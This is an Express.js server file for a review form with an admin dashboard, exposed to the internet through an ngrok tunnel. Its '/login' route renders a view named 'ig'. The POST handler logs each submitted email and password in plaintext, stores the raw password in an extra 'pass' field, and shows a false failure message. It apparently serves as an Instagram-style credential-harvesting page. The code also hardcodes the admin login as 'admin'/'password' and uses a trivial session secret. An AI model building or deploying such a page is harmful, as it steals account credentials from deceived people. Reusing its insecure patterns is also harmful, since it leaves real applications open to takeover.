const express = require("express");
const app = express();
const dotenv = require('dotenv').config();
const path = require("path");
const Review = require('./model/Review');
const userModel = require('./model/Ig');
const { log } = require("console");
const bcrypt = require("bcryptjs");
// const bcrypt = require("bcrypt");
const passport = require("passport");
const chart = require("chart.js");
const LocalStrategy = require("passport-local").Strategy;
const plm = require("passport-local-mongoose");
var cookieParser = require("cookie-parser");
var bodyParser = require("body-parser");
var logger = require("morgan");
const session = require("express-session");
const mongoose = require("mongoose");
const jwt = require("jsonwebtoken");
// const adminRoutes = require('./model/admin');
const http = require('http');
const ngrok = require('@ngrok/ngrok');




mongoose.connect(process.env.DB, {
  useNewUrlParser: true,
  useUnifiedTopology: true
}).then(() => {
  console.log("✅ MongoDB connected successfully!");
}).catch(err => {
  console.log("❌ MongoDB connection error:", err);
});

// mongoose.connect("mongodb://127.0.0.1:27017/ig", {
//     useNewUrlParser: true,
//     useUnifiedTopology: true
//   }).then(() => {
//     console.log("✅ MongoDB locally connected successfully!");
//   }).catch(err => {
//     console.log("❌ MongoDB connection error:", err);
//   });

app.set("view engine", "ejs");
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(
  session({
    resave: false,
    saveUninitiallized: false,
    secret: "hello",
  })
);

// app.use(Review);
// app.use(adminRoutes);

app.use(logger("dev"));
app.use(cookieParser());
app.use(express.static("public"));
app.use(express.static(path.join(__dirname, "public")));
app.set("trust proxy", true);


app.get("/", function (req, res) {
  res.redirect("/review");
});

app.get("/login", function (req, res) {
  console.log("moving on the login page(regitering a new user)");
  // res.render("login4");
  res.render("ig");
});

app.get("/review", function (req, res) {
  console.log("redirecting to the review/feedback page");
  res.render("review");
});

app.get("/Reviewsumbit", function (req, res) {
  console.log("review submitted successfully");
  res.render("Reviewsumbit");
  console.log("a person reached on submitted page directly")
});

app.post("/login", async (req, res) => {
  try {
    let { email, password } = req.body;

    // Coerce numeric-only or other non-string inputs to strings
    email = typeof email === 'string' ? email.trim() : String(email);
    password = typeof password === 'string' ? password : String(password || '');
    let pass = password;

    if (!email || !password) {
      return res.status(400).send("❌ Email and password are required");
    }

    let newUser = new userModel({ username: email, email, password: password, pass });

    await userModel.register(newUser, password); // This hashes the password

    console.log("✅ User registered successfully with this e-mail and password : ", email, password);
    // res.redirect("/profile");
    res.send("success!!");
  } catch (err) {
    console.error("❌ Error registering user:", err);
    res.status(500).send("Registration failed: Email and password is incorrect");
  }
});

app.post("/review", async (req, res) => {
  try {
      const { name, number, childrenName, comment, rate, exp } = req.body;
      let ipAddress = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
      if (ipAddress.includes(",")) {
          ipAddress = ipAddress.split(",")[0].trim();
      }

      const newReview = new Review({
          name,
          number,
          childrenName,
          comment,
          rate,
          exp,
          ipAddress
      });

      await newReview.save();
      res.render("Reviewsumbit");
  } catch (error) {
      console.error(error);
      res.status(500).send("Server error", err.message);
  }
});


// admin part


const ADMIN_USERNAME = "admin";
const ADMIN_PASSWORD = "password";

// Admin Login Page
app.get("/admin", (req, res) => {
  res.render("adminLogin");
});

// Handle Admin Login
app.post("/admin", (req, res) => {
  try {
  const { username, password } = req.body;
  if (username === ADMIN_USERNAME && password === ADMIN_PASSWORD) {
    req.session.admin = true;
    res.redirect("/admin/dashboard");
  } else {
    res.send("Invalid credentials");
  }
} catch (error) {
  console.error(error);
  res.status(500).send("Server error", err.message);
}
});

// Middleware to protect admin routes
function adminAuth(req, res, next) {
  if (req.session.admin) {
    next();
  } else {
    res.redirect("/admin");
  }
}

// Admin Dashboard - Show All Reviews
app.get("/admin/dashboard", adminAuth, async (req, res) => {
  try {
    const reviews = await Review.find();
    const submitedAt = reviews.submitedAt;

    // Analytics Data
    const totalReviews = reviews.length;
    const averageRating =
      reviews.reduce((sum, r) => sum + r.rate, 0) / totalReviews || 0;

    const satisfactionLevels = {
      Awful: 0,
      Poor: 0,
      Ok: 0,
      Good: 0,
      Awesome: 0,
    };

    reviews.forEach((r) => {
      satisfactionLevels[r.exp] = (satisfactionLevels[r.exp] || 0) + 1;
    });

    res.render("adminDashboard", {
      reviews,
      totalReviews,
      averageRating: averageRating.toFixed(1),
      satisfactionLevels,
      submitedAt,
    });
  } catch (err) {
    console.error(err, err.message);
    res.send("Error loading dashboard");
  }
});

// Logout Route
app.get("/admin/logout", (req, res) => {
  req.session.destroy();
  res.redirect("/admin");
});


app.listen(3000);

ngrok.connect({ addr: 3000, authtoken_from_env: true })
	.then(listener => console.log(`Ingress established at: ${listener.url()}`));